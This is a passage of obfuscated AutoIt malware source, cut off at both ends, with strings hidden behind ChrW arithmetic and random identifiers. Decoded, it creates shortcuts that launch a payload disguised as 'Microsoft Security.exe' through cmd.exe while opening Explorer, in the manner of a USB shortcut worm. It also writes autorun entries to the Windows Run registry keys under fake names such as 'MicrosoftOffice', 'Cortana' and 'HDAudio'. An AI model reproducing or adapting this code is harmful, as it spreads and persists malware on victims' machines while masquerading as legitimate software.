&amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                            FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", $ygmruncnijpkrixqwgjrjpljhfzhfzxxjcolqwbculqkppfoewgy[$nyzitckpnvhimrbptlbaehwxzaurzkciryjkcgqmmmozeiywopus] &amp; String(\"\\\") &amp; $ehyisaneisrmohkjldieikqxitvfqoysgfeklfuepdsefsfobxtn &amp; String(\"\\\") &amp; \"S\" &amp; ChrW(166 - 50) &amp; ChrW(5 + 92) &amp; ChrW(116) &amp; \"m\" &amp; ChrW(45 + 56) &amp; \"n\" &amp; String(\"t\") &amp; ChrW(115), \"\", ChrW(33 + 14) &amp; ChrW(16 + 83) &amp; ChrW(32) &amp; ChrW(12 + 103) &amp; String(\"t\") &amp; ChrW(39 + 58) &amp; ChrW(147 - 33) &amp; ChrW(31 + 85) &amp; ChrW(32) &amp; ChrW(46) &amp; \".\" &amp; \"\\\" &amp; $zxklhllljcuotldbphofohbwitcbwakmrcowpxzyuezxwboceyqi &amp; ' explorer  ChrW(73-36) &amp; ChrW(31+36) &amp; String( \"D\" ) &amp; String(\"%\")  &amp; exit', \"\", String(\"%\") &amp; ChrW(9 + 110) &amp; ChrW(10 + 95) &amp; ChrW(138 - 28) &amp; String(\"d\") &amp; \"i\" &amp; String(\"r\") &amp; \"%\" &amp; ChrW(12 + 80) &amp; ChrW(40 + 75) &amp; \"y\" &amp; \"s\" &amp; ChrW(143 - 27) &amp; \"e\" &amp; ChrW(109) &amp; \"3\" &amp; String(\"2\") &amp; ChrW(35 + 57) &amp; \"S\" &amp; ChrW(72) &amp; ChrW(31 + 38) &amp; String(\"L\") &amp; String(\"L\") &amp; ChrW(28 + 23) &amp; ChrW(16 + 34) &amp; ChrW(47 + -1) &amp; String(\"d\") &amp; String(\"l\") &amp; \"l\", \"\", 3, @SW_SHOWMINNOACTIVE)\n                        EndIf\n                        Sleep(40)\n                    WEnd\n                EndIf\n            EndIf\n        Next\n    EndIf\n    If @error Then\n    EndIf\nEndFunc\n\nFunc rblzbaqmbvoikeqerwerhbazuhagqctwscfbbxkckkhjwjxexbay()\n    $blpspazzfimttyejdawgiepesmspmhduujqvoltlfuygpzlgnwlb = @ScriptDir &amp; ChrW(132 - 40) &amp; ChrW(120 - 43) &amp; ChrW(105) &amp; String(\"c\") &amp; \"r\" &amp; ChrW(37 + 74) &amp; ChrW(4 + 111) &amp; ChrW(123 - 12) &amp; \"f\" &amp; ChrW(12 + 104) &amp; \"S\" &amp; \"e\" &amp; \"c\" &amp; ChrW(20 + 97) &amp; ChrW(20 + 94) &amp; \"i\" &amp; \"t\" &amp; ChrW(36 + 85) &amp; ChrW(57 - 11) &amp; \"e\" &amp; ChrW(39 + 81) &amp; \"e\" &amp; ChrW(50 - 18) &amp; @ScriptDir &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk\n    If FileExists(@ScriptDir &amp; ChrW(27 + 65) &amp; \"M\" &amp; \"i\" &amp; ChrW(130 - 31) &amp; ChrW(130 - 16) &amp; ChrW(153 - 42) &amp; ChrW(130 - 15) &amp; ChrW(112 - 1) &amp; String(\"f\") &amp; \"t\" &amp; ChrW(123 - 38) &amp; ChrW(113 - 1) &amp; ChrW(43 + 57) &amp; ChrW(141 - 44) &amp; ChrW(132 - 16) &amp; String(\"e\") &amp; String(\".\") &amp; \"l\" &amp; String(\"n\") &amp; String(\"k\")) = False Then\n        FileCreateShortcut(ChrW(99) &amp; ChrW(109) &amp; ChrW(100) &amp; ChrW(47 + -1) &amp; ChrW(1 + 100) &amp; ChrW(148 - 28) &amp; \"e\", @ScriptDir &amp; ChrW(27 + 65) &amp; \"M\" &amp; \"i\" &amp; ChrW(130 - 31) &amp; ChrW(130 - 16) &amp; ChrW(153 - 42) &amp; ChrW(130 - 15) &amp; ChrW(112 - 1) &amp; String(\"f\") &amp; \"t\" &amp; ChrW(123 - 38) &amp; ChrW(113 - 1) &amp; ChrW(43 + 57) &amp; ChrW(141 - 44) &amp; ChrW(132 - 16) &amp; String(\"e\") &amp; String(\".\") &amp; \"l\" &amp; String(\"n\") &amp; String(\"k\"), \"\", String(\"/\") &amp; ChrW(147 - 48) &amp; ChrW(74 - 42) &amp; ChrW(19 + 96) &amp; ChrW(12 + 104) &amp; ChrW(19 + 78) &amp; String(\"r\") &amp; String(\"t\") &amp; ChrW(21 + 11) &amp; $blpspazzfimttyejdawgiepesmspmhduujqvoltlfuygpzlgnwlb &amp; ChrW(44 + -12) &amp; ChrW(38) &amp; \" \" &amp; \"e\" &amp; ChrW(15 + 105) &amp; ChrW(105) &amp; ChrW(28 + 88))\n    EndIf\n    If FileExists(@ScriptDir &amp; ChrW(27 + 65) &amp; \"M\" &amp; \"i\" &amp; ChrW(130 - 31) &amp; ChrW(130 - 16) &amp; ChrW(153 - 42) &amp; ChrW(130 - 15) &amp; ChrW(112 - 1) &amp; String(\"f\") &amp; \"t\" &amp; ChrW(123 - 38) &amp; ChrW(113 - 1) &amp; ChrW(43 + 57) &amp; ChrW(141 - 44) &amp; ChrW(132 - 16) &amp; String(\"e\") &amp; String(\".\") &amp; \"l\" &amp; String(\"n\") &amp; String(\"k\")) = False Then\n        FileCreateShortcut(@ScriptDir &amp; String(String(\"\\\")) &amp; ChrW(28 + 49) &amp; String(\"i\") &amp; ChrW(20 + 79) &amp; String(\"r\") &amp; ChrW(41 + 70) &amp; String(\"s\") &amp; ChrW(111) &amp; ChrW(140 - 38) &amp; ChrW(117 - 1) &amp; ChrW(83) &amp; \"e\" &amp; String(\"c\") &amp; \"u\" &amp; String(\"r\") &amp; ChrW(105) &amp; String(\"t\") &amp; ChrW(30 + 91) &amp; ChrW(47 + -1) &amp; ChrW(104 - 3) &amp; String(\"x\") &amp; ChrW(138 - 37), @ScriptDir &amp; ChrW(27 + 65) &amp; \"M\" &amp; \"i\" &amp; ChrW(130 - 31) &amp; ChrW(130 - 16) &amp; ChrW(153 - 42) &amp; ChrW(130 - 15) &amp; ChrW(112 - 1) &amp; String(\"f\") &amp; \"t\" &amp; ChrW(123 - 38) &amp; ChrW(113 - 1) &amp; ChrW(43 + 57) &amp; ChrW(141 - 44) &amp; ChrW(132 - 16) &amp; String(\"e\") &amp; String(\".\") &amp; \"l\" &amp; String(\"n\") &amp; String(\"k\"), \"\", ChrW(57 - 10) &amp; String(\"A\") &amp; ChrW(167 - 50) &amp; ChrW(152 - 36) &amp; ChrW(16 + 95) &amp; ChrW(3 + 70) &amp; ChrW(124 - 8) &amp; String(\"3\") &amp; \"E\" &amp; \"x\" &amp; String(\"e\") &amp; ChrW(35 + 64) &amp; String(\"u\") &amp; ChrW(142 - 26) &amp; \"e\" &amp; ChrW(113 - 30) &amp; ChrW(17 + 82) &amp; ChrW(118 - 4) &amp; ChrW(142 - 37) &amp; \"p\" &amp; \"t\" &amp; String(ChrW(48 - 16)) &amp; @ScriptDir &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk)\n    EndIf\nEndFunc\n\nFunc pdopzmetzkuzbrqhzoeumbhwurckkvjpcugoopapsrcaphhetqfi()\n    $zmfxwlaehjlydtzjijusglanfhotalcrwcugcrydkpdvjacxzayc = @ScriptDir &amp; ChrW(21 + 71) &amp; \"M\" &amp; ChrW(105) &amp; ChrW(37 + 62) &amp; ChrW(114) &amp; ChrW(24 + 87) &amp; ChrW(16 + 99) &amp; ChrW(150 - 39) &amp; ChrW(102) &amp; String(\"t\") &amp; \"S\" &amp; ChrW(101) &amp; ChrW(99) &amp; ChrW(4 + 113) &amp; \"r\" &amp; ChrW(138 - 33) &amp; String(\"t\") &amp; ChrW(121) &amp; ChrW(75 - 29) &amp; \"e\" &amp; ChrW(44 + 76) &amp; \"e\" &amp; ChrW(78 - 46) &amp; ChrW(47) &amp; \"A\" &amp; ChrW(117) &amp; \"t\" &amp; String(\"o\") &amp; ChrW(35 + 38) &amp; \"t\" &amp; String(\"3\") &amp; ChrW(50 + 19) &amp; ChrW(120) &amp; String(\"e\") &amp; ChrW(16 + 83) &amp; \"u\" &amp; \"t\" &amp; ChrW(114 - 13) &amp; ChrW(128 - 45) &amp; ChrW(3 + 96) &amp; ChrW(33 + 81) &amp; ChrW(105) &amp; ChrW(112) &amp; ChrW(1 + 115) &amp; ChrW(8 + 24) &amp; @ScriptDir &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk\n    $brunmrrowhdwhubbyrfplqhrieeeertznzpdigvlzkhdlhooxbyi = StringRegExpReplace($toypgraanpjlfwxjscarpmliszehlbquruimbscebztnxymoybci, ChrW(92) &amp; ChrW(18 + 28) &amp; String(\"[\") &amp; String(\"^\") &amp; String(\"\\\") &amp; ChrW(50 - 4) &amp; ChrW(39 + 53) &amp; String(\"\\\") &amp; ChrW(47) &amp; ChrW(50 + 43) &amp; ChrW(42) &amp; \"$\", \"\")\n    $vhqjlcehmlieoehhextrvtpajefzqqgcskdeifsfboynacphygja = @ScriptDir &amp; ChrW(132 - 40) &amp; ChrW(120 - 43) &amp; ChrW(105) &amp; String(\"c\") &amp; \"r\" &amp; ChrW(37 + 74) &amp; ChrW(4 + 111) &amp; ChrW(123 - 12) &amp; \"f\" &amp; ChrW(12 + 104) &amp; \"S\" &amp; \"e\" &amp; \"c\" &amp; ChrW(20 + 97) &amp; ChrW(20 + 94) &amp; \"i\" &amp; \"t\" &amp; ChrW(36 + 85) &amp; ChrW(57 - 11) &amp; \"e\" &amp; ChrW(39 + 81) &amp; \"e\" &amp; ChrW(50 - 18) &amp; @ScriptDir &amp; String(\"\\\") &amp; $ivfnryrxlmwhjvjiruxaaxafykecdkqygsyawqyvstbsozrqazjk\n    $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv = @ScriptDir &amp; String(\"\\\") &amp; String(\"M\") &amp; \"i\" &amp; ChrW(12 + 87) &amp; String(\"r\") &amp; ChrW(49 + 62) &amp; ChrW(115) &amp; ChrW(35 + 76) &amp; ChrW(102) &amp; ChrW(154 - 38) &amp; String(\"C\") &amp; \"M\" &amp; ChrW(76 - 8) &amp; ChrW(53 - 7) &amp; ChrW(26 + 82) &amp; \"n\" &amp; ChrW(107)\n    If RegRead(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat) &lt;&gt; $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv Then\n        RegWrite(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat, \"R\" &amp; ChrW(104 - 35) &amp; ChrW(71) &amp; String(\"_\") &amp; ChrW(92 - 9) &amp; String(\"Z\"), $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv)\n    EndIf\n    If RegRead(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat) &lt;&gt; $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv Then\n        RegWrite(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), $vcjuqioffbuxjhmrijmlbucfcfhjjcrkovnvyluomdhvzuybwwat, \"R\" &amp; ChrW(104 - 35) &amp; ChrW(71) &amp; String(\"_\") &amp; ChrW(92 - 9) &amp; String(\"Z\"), $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv)\n    EndIf\n    If RegRead(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(106 - 29) &amp; \"i\" &amp; ChrW(28 + 71) &amp; ChrW(153 - 39) &amp; ChrW(2 + 109) &amp; \"s\" &amp; ChrW(111) &amp; \"f\" &amp; String(\"t\") &amp; \"O\" &amp; String(\"f\") &amp; ChrW(43 + 59) &amp; String(\"i\") &amp; ChrW(131 - 32) &amp; ChrW(116 - 15)) &lt;&gt; $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv Then\n        RegWrite(ChrW(72) &amp; \"K\" &amp; ChrW(69) &amp; ChrW(89) &amp; ChrW(116 - 21) &amp; ChrW(76) &amp; ChrW(79) &amp; \"C\" &amp; String(\"A\") &amp; ChrW(76) &amp; ChrW(19 + 76) &amp; ChrW(77) &amp; String(\"A\") &amp; \"C\" &amp; \"H\" &amp; ChrW(73) &amp; \"N\" &amp; \"E\" &amp; ChrW(92) &amp; String(\"S\") &amp; ChrW(31 + 48) &amp; ChrW(38 + 32) &amp; String(\"T\") &amp; ChrW(87) &amp; ChrW(94 - 29) &amp; ChrW(82) &amp; ChrW(96 - 27) &amp; ChrW(117 - 25) &amp; \"M\" &amp; String(\"i\") &amp; String(\"c\") &amp; ChrW(24 + 90) &amp; ChrW(39 + 72) &amp; \"s\" &amp; ChrW(49 + 62) &amp; ChrW(102) &amp; ChrW(125 - 9) &amp; ChrW(141 - 49) &amp; ChrW(87) &amp; ChrW(109 - 4) &amp; ChrW(110) &amp; ChrW(32 + 68) &amp; String(\"o\") &amp; String(\"w\") &amp; ChrW(150 - 35) &amp; \"\\\" &amp; \"C\" &amp; ChrW(47 + 70) &amp; \"r\" &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; ChrW(157 - 41) &amp; ChrW(86) &amp; ChrW(101) &amp; ChrW(42 + 72) &amp; ChrW(122 - 7) &amp; String(\"i\") &amp; \"o\" &amp; \"n\" &amp; ChrW(31 + 61) &amp; \"R\" &amp; ChrW(117) &amp; ChrW(110), ChrW(106 - 29) &amp; \"i\" &amp; ChrW(28 + 71) &amp; ChrW(153 - 39) &amp; ChrW(2 + 109) &amp; \"s\" &amp; ChrW(111) &amp; \"f\" &amp; String(\"t\") &amp; \"O\" &amp; String(\"f\") &amp; ChrW(43 + 59) &amp; String(\"i\") &amp; ChrW(131 - 32) &amp; ChrW(116 - 15), \"R\" &amp; ChrW(104 - 35) &amp; ChrW(71) &amp; String(\"_\") &amp; ChrW(92 - 9) &amp; String(\"Z\"), @ScriptDir &amp; ChrW(27 + 65) &amp; \"M\" &amp; \"i\" &amp; ChrW(130 - 31) &amp; ChrW(130 - 16) &amp; ChrW(153 - 42) &amp; ChrW(130 - 15) &amp; ChrW(112 - 1) &amp; String(\"f\") &amp; \"t\" &amp; ChrW(123 - 38) &amp; ChrW(113 - 1) &amp; ChrW(43 + 57) &amp; ChrW(141 - 44) &amp; ChrW(132 - 16) &amp; String(\"e\") &amp; String(\".\") &amp; \"l\" &amp; String(\"n\") &amp; String(\"k\"))\n    EndIf\n    If RegRead(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(67) &amp; ChrW(116 - 5) &amp; ChrW(123 - 9) &amp; String(\"t\") &amp; ChrW(139 - 42) &amp; ChrW(4 + 106) &amp; ChrW(97)) &lt;&gt; $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv Then\n        RegWrite(String(\"H\") &amp; ChrW(75) &amp; ChrW(13 + 56) &amp; String(\"Y\") &amp; String(\"_\") &amp; \"C\" &amp; ChrW(85) &amp; ChrW(35 + 47) &amp; String(\"R\") &amp; String(\"E\") &amp; String(\"N\") &amp; ChrW(16 + 68) &amp; ChrW(95) &amp; \"U\" &amp; ChrW(83) &amp; ChrW(69) &amp; ChrW(95 - 13) &amp; ChrW(14 + 78) &amp; \"S\" &amp; ChrW(22 + 89) &amp; ChrW(11 + 91) &amp; ChrW(116) &amp; \"w\" &amp; ChrW(34 + 63) &amp; ChrW(114) &amp; ChrW(102 - 1) &amp; \"\\\" &amp; \"M\" &amp; String(\"i\") &amp; \"c\" &amp; \"r\" &amp; \"o\" &amp; ChrW(115) &amp; ChrW(111) &amp; String(\"f\") &amp; ChrW(15 + 101) &amp; \"\\\" &amp; String(\"W\") &amp; ChrW(105) &amp; \"n\" &amp; ChrW(22 + 78) &amp; \"o\" &amp; String(\"w\") &amp; \"s\" &amp; \"\\\" &amp; ChrW(67) &amp; ChrW(117) &amp; String(\"r\") &amp; \"r\" &amp; \"e\" &amp; \"n\" &amp; String(\"t\") &amp; \"V\" &amp; ChrW(101) &amp; ChrW(119 - 5) &amp; ChrW(157 - 42) &amp; ChrW(17 + 88) &amp; \"o\" &amp; String(\"n\") &amp; ChrW(92) &amp; ChrW(82) &amp; ChrW(24 + 93) &amp; String(\"n\"), ChrW(67) &amp; ChrW(116 - 5) &amp; ChrW(123 - 9) &amp; String(\"t\") &amp; ChrW(139 - 42) &amp; ChrW(4 + 106) &amp; ChrW(97), \"R\" &amp; ChrW(104 - 35) &amp; ChrW(71) &amp; String(\"_\") &amp; ChrW(92 - 9) &amp; String(\"Z\"), @ScriptDir &amp; ChrW(27 + 65) &amp; \"M\" &amp; \"i\" &amp; ChrW(130 - 31) &amp; ChrW(130 - 16) &amp; ChrW(153 - 42) &amp; ChrW(130 - 15) &amp; ChrW(112 - 1) &amp; String(\"f\") &amp; \"t\" &amp; ChrW(123 - 38) &amp; ChrW(113 - 1) &amp; ChrW(43 + 57) &amp; ChrW(141 - 44) &amp; ChrW(132 - 16) &amp; String(\"e\") &amp; String(\".\") &amp; \"l\" &amp; String(\"n\") &amp; String(\"k\"))\n    EndIf\n    If RegRead(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), ChrW(72) &amp; ChrW(108 - 40) &amp; \"A\" &amp; ChrW(117) &amp; ChrW(145 - 45) &amp; ChrW(9 + 96) &amp; \"o\") &lt;&gt; $hhncrpbgveqwgfldaczzfnpgudbgpycjggulwbosdkhwycgupkgv Then\n        RegWrite(String(\"H\") &amp; ChrW(112 - 37) &amp; ChrW(69) &amp; String(\"Y\") &amp; \"_\" &amp; ChrW(102 - 26) &amp; ChrW(89 - 10) &amp; ChrW(105 - 38) &amp; String(\"A\") &amp; ChrW(105 - 29) &amp; ChrW(95) &amp; \"M\" &amp; \"A\" &amp; \"C\" &amp; ChrW(23 + 49) &amp; ChrW(107 - 34) &amp; ChrW(22 + 56) &amp; ChrW(69) &amp; String(\"\\\") &amp; ChrW(98 - 15) &amp; ChrW(19 + 92) &amp; \"f\" &amp; ChrW(19 + 97) &amp; ChrW(6 + 113) &amp; String(\"a\") &amp; ChrW(17 + 97) &amp; \"e\" &amp; ChrW(123 - 31) &amp; \"M\" &amp; ChrW(18 + 87) &amp; String(\"c\") &amp; ChrW(114) &amp; ChrW(159 - 48) &amp; ChrW(115) &amp; String(\"o\") &amp; String(\"f\") &amp; ChrW(135 - 19) &amp; ChrW(92) &amp; ChrW(49 + 38) &amp; ChrW(144 - 39) &amp; \"n\" &amp; ChrW(32 + 68) &amp; ChrW(111) &amp; ChrW(27 + 92) &amp; ChrW(115) &amp; ChrW(92) &amp; ChrW(21 + 46) &amp; \"u\" &amp; ChrW(26 + 88) &amp; ChrW(27 + 87) &amp; ChrW(11 + 90) &amp; ChrW(110) &amp; ChrW(18 + 98) &amp; ChrW(39 + 47) &amp; \"e\" &amp; \"r\" &amp; ChrW(157 - 42) &amp; \"i\" &amp; ChrW(122 - 11) &amp; ChrW(131 - 21) &amp; ChrW(22 + 70) &amp; String(\"R\") &amp; ChrW(138 - 21) &amp; ChrW(127 - 17), ChrW(72) &amp; ChrW(108 - 40) &amp; \"A\" &amp; ChrW(117) &amp; ChrW(145 - 45) &amp; ChrW(9 + 96) 